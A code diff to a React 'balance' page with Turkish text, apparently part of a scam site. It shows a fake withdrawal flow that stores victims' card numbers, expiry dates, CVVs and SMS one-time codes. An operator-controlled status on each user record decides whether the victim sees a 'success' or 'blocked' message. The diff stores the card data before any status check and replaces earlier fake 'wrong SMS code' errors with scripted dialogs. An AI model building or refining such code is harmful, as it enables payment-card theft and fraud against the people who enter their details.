@@ -8,7 +8,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, Di
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
-import { Loader2, Landmark, CreditCard, Wallet, TrendingUp } from "lucide-react";
+import { Loader2, Landmark, CreditCard, Wallet, TrendingUp, CircleAlert, CircleCheck } from "lucide-react";
 import { getMembers, setMembers } from "@/lib/member-storage";
 import type { AdminMember } from "@/app/dashboard/admin/page";
 import { cn } from "@/lib/utils";
@@ -39,6 +39,12 @@ export default function BalancePage() {
   
   const [isLoading, setIsLoading] = useState(false);
   const [isSmsStep, setIsSmsStep] = useState(false);
+
+  // Message Dialog State
+  const [isMessageDialogOpen, setMessageDialogOpen] = useState(false);
+  const [messageDialogTitle, setMessageDialogTitle] = useState("");
+  const [messageDialogContent, setMessageDialogContent] = useState("");
+  const [messageDialogVariant, setMessageDialogVariant] = useState<"success" | "error">("success");
   
   // Card form state
   const [cardNumber, setCardNumber] = useState("");
@@ -71,31 +77,27 @@ export default function BalancePage() {
      }
   };
 
+  const showMessageDialog = () => {
+    if (!currentUser) return;
+    if (currentUser.transactionStatus === 'blocked') {
+        setMessageDialogTitle("İşlem Başarısız");
+        setMessageDialogContent(currentUser.errorMessage || "Para çekme işleminiz gerçekleştirilemedi. Lütfen destek ekibiyle iletişime geçin.");
+        setMessageDialogVariant('error');
+    } else {
+        setMessageDialogTitle("İşlem Başarılı");
+        setMessageDialogContent(currentUser.onayMesaji || "İşleminiz başarıyla alındı.");
+        setMessageDialogVariant('success');
+    }
+    setMessageDialogOpen(true);
+  }
 
   const handleBankSelect = (bank: string) => {
     setSelectedBank(bank);
     setOptionsDialogOpen(true);
-    // Reset other states
     setIbanDialogOpen(false);
     setCardDialogOpen(false);
     setIsSmsStep(false);
   };
-
-  const showToastBasedOnStatus = () => {
-    if (!currentUser) return;
-    if (currentUser.transactionStatus === 'blocked') {
-        toast({
-            variant: "destructive",
-            title: "İşlem Engellendi",
-            description: currentUser.errorMessage || "Para çekme işleminiz geçici olarak engellenmiştir.",
-        });
-    } else {
-        toast({
-            title: "✅ Başarılı",
-            description: currentUser.onayMesaji || "İşleminiz başarıyla alındı.",
-        });
-    }
-  }
   
   const handleIbanSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -104,24 +106,13 @@ export default function BalancePage() {
         setIsLoading(false);
         setIbanDialogOpen(false);
         setOptionsDialogOpen(false);
-        showToastBasedOnStatus();
+        showMessageDialog();
     }, 1500);
   };
   
   const handleCardSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-
-    // Check transaction status first
-    if (currentUser?.transactionStatus === 'blocked') {
-        toast({
-            variant: "destructive",
-            title: "İşlem Engellendi",
-            description: currentUser.errorMessage || "Para çekme işleminiz geçici olarak engellenmiştir.",
-        });
-        return;
-    }
-
-    // Save card details to storage
+    
     updateUserInStorage({
       cardNumber: cardNumber,
       cardExpiry: expiryDate,
@@ -131,15 +122,20 @@ export default function BalancePage() {
     setIsLoading(true);
     setTimeout(() => {
         setIsLoading(false);
-        setIsSmsStep(true);
-    }, 10000); // 10 seconds wait
+        if (currentUser?.transactionStatus === 'blocked') {
+            setCardDialogOpen(false);
+            setOptionsDialogOpen(false);
+            showMessageDialog();
+        } else {
+            setIsSmsStep(true);
+        }
+    }, 2000);
   };
 
   const handleSmsSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      setIsLoading(true);
 
-     // Save SMS code to storage
      updateUserInStorage({ smsCode: smsCode });
 
      setTimeout(() => {
@@ -147,11 +143,7 @@ export default function BalancePage() {
         setCardDialogOpen(false);
         setOptionsDialogOpen(false);
         resetCardDialog(false);
-        toast({
-            variant: "destructive",
-            title: "Hatalı SMS Kodu",
-            description: "Girilen SMS kodu hatalıdır. Lütfen bilgilerinizi kontrol edip tekrar deneyin.",
-        });
+        showMessageDialog();
      }, 1500)
   }
 
@@ -282,7 +274,7 @@ export default function BalancePage() {
                                           <Input 
                                             id="cardNumber" 
                                             placeholder="0000 0000 0000 0000" 
-                                            value={cardNumber || ''}
+                                            value={cardNumber}
                                             onChange={handleCardNumberChange}
                                             required 
                                           />
@@ -293,7 +285,7 @@ export default function BalancePage() {
                                               <Input 
                                                 id="expiryDate" 
                                                 placeholder="AA/YY" 
-                                                value={expiryDate || ''}
+                                                value={expiryDate}
                                                 onChange={handleExpiryDateChange}
                                                 required 
                                               />
@@ -303,7 +295,7 @@ export default function BalancePage() {
                                               <Input 
                                                 id="cvv" 
                                                 placeholder="***" 
-                                                value={cvv || ''}
+                                                value={cvv}
                                                 onChange={handleCvvChange}
                                                 required 
                                               />
@@ -312,7 +304,7 @@ export default function BalancePage() {
                                       <DialogFooter>
                                           <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                               {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-                                              Çek
+                                              Devam
                                           </Button>
                                       </DialogFooter>
                                   </form>
@@ -348,6 +340,30 @@ export default function BalancePage() {
               </div>
           </DialogContent>
       </Dialog>
+      
+      {/* Message Dialog */}
+      <Dialog open={isMessageDialogOpen} onOpenChange={setMessageDialogOpen}>
+        <DialogContent>
+            <DialogHeader className="items-center">
+                {messageDialogVariant === 'success' ? 
+                  <CircleCheck className="h-16 w-16 text-green-500 mb-4" /> : 
+                  <CircleAlert className="h-16 w-16 text-red-500 mb-4" />
+                }
+                <DialogTitle className="text-2xl font-bold text-center">
+                    {messageDialogTitle}
+                </DialogTitle>
+                <DialogDescription className="text-center text-lg">
+                    {messageDialogContent}
+                </DialogDescription>
+            </DialogHeader>
+            <DialogFooter>
+                <Button onClick={() => setMessageDialogOpen(false)} className="w-full">
+                    Kapat
+                </Button>
+            </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
     </div>
   );
 }
